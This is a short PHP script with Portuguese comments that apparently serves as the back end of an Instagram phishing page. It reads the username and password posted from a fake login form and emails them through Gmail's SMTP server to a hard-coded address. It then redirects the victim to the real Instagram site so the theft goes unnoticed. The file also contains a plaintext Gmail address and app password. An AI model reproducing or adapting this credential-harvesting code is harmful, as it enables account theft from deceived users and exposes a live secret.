<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Carregar o autoload do Composer
require 'vendor/autoload.php';

$mail = new PHPMailer(true);

try {
    // Configurações do servidor SMTP
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'guigoalvesluz.001@gmail.com'; // Seu e-mail
    $mail->Password   = 'vcox yemk wmcg ehty';          // Senha de aplicativo
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 587;

    // Destinatário
    $mail->setFrom('guigoalvesluz.001@gmail.com', 'Mailer');
    $mail->addAddress('guigoalvesluz.001@gmail.com');  // Seu e-mail para receber os dados

    // Obter os dados do formulário
    $usuario = $_POST['username'];
    $senha = $_POST['password'];

    // Assunto do e-mail
    $mail->Subject = 'Novo login enviado pelo formulário';

    // Corpo do e-mail
    $mail->isHTML(true);
    $mail->Body    = "Usuário: $usuario <br> Senha: $senha";
    $mail->AltBody = "Usuário: $usuario \n Senha: $senha";

    // Enviar o e-mail
    $mail->send();

    // Redirecionar para a página inicial do Instagram
    header('Location: https://www.instagram.com/');
    exit;
} catch (Exception $e) {
    echo "Mensagem não pôde ser enviada. Erro: {$mail->ErrorInfo}";
}
?>